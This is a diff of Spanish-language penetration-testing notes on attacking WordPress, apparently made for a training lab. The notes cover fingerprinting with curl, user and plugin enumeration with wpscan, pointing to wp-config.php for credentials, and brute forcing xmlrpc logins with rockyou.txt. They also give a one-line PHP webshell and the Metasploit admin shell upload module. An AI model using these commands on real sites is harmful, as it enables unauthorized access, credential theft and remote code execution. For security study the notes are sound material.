@@ -1,21 +1,64 @@
 	#### Attacking Wordpress
+Es un CMS altamente customizable. Esto genera que ante un mal uso o malas configuraciones pueda tener vulnerabilidades.
+
+	### Discovery / Footprint
+/robots.txt
+#Para identificar un sitio wordpress podemos visitar el robots.txt. En este se podrian encontrar algunos allow o disallow que nos den pistas de que es una pagina wordpress
+curl -s http://<dominio> | grep WordPress
+#Con esto podemos buscar informacion y asi saber si es wp o no dependiendo el output que nos devuelva puesto que es muy probable que nos devuelva la versio de wp.
+curl -s http://<dominio> | grep themes
+#Permite buscar los themas que se estan usando en l apagina wp
+curl -s http://<dominio> | grep plugins
+#De esta forma, podemos buscar los plugins. Ver seccion de mas abajo al respecto
 
 	### User enumeration
+El login (wp-login.php) por default tiene mensajes distintos tanto para un usuario o contraseña incorrecta.
+
 searchsploit wordpress user enumeration
 #Nos muestra un script en php para enumerar usuarios
 curl -s -X GET <url>/wp-json/wp/v2/users
 #Ruta que consulta el script. De esta forma podemos ver si responde con un json
+wpscan --url http://blog.inlanefreight.local/ --enumerate
+#Al igual que con los plugins, permite enumerar usuarios
 
 	### Plugins
-Si bien el wordpress que se usa puede no tener vulnerabilidades conocidas, existe la posibilidad que se este usando un plugin que si tiene vulnerabilidades conocidas.
+Si bien el wordpress que se usa puede no tener vulnerabilidades conocidas, existe la posibilidad que se este usando un plugin que si tiene vulnerabilidades.
 
 /wp-content/plugins
-#En esta ubicacion suelen estar los plugins que se usan
-#Estos podrian verse sin bruteforcear si el directory listing esta habilitado
+#En esta ubicacion suelen estar los plugins que se usan. Estos podrian verse sin bruteforcear si el directory listing esta habilitado
+/wp-content/plugins/<plugin name>
+#Visitar el plugin para poder ver informacin de este en caso de ser posible
+#En el caso donde no muestre nada se debe intentar acceder al /reedme.txt para tener informacion del plugin como por ej su version
 Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
 #Path para diccionario de plugins wp
+
+	### WPScan
+sudo gem install wpscan
+#Es un tool de enumeracion automatico que determina si varios themas y plugins usados son vulnerables.
+
+	## Flags
+--url
+#Se especifica la url de la pagina wp
+--enumerate
+#Se usa esta flag para enumerar varios componentes de wordpress como plugins, temas, usuarios, backups y media. Todo esto de forma default.
+--api-token
+#Con el token de nuestra cuenta free en la pagina tenemos hasta 75 request diarias para realizar analisis de vulnerabilidades en la pagina usando contenido externo como reportes.
+-t
+#Ajusta los hilos. Default 5
+
 
 	### Archivos importantes
 wp-config.php
 #Es un archivo en word press que suele tener credenciales de base de datos y contraseñas.
+
+
+	## Brute forcing
+sudo wpscan --password-attack xmlrpc -t 20 -U <usuario> -P /usr/share/wordlists/rockyou.txt --url http://<url>
+#Bruteforce con wpscan
+
+	## Code execution
+system($_GET[0]);
+#Con acceso administrativo podemos modificar el codigo PHP para ejecutar comandos
+use exploit/unix/webapp/wp_admin_shell_upload 
+#Modulo de Metasploit que permite subir una web shell y ejecutarla automaticamente mediante un usuario y contraseña de admin
 
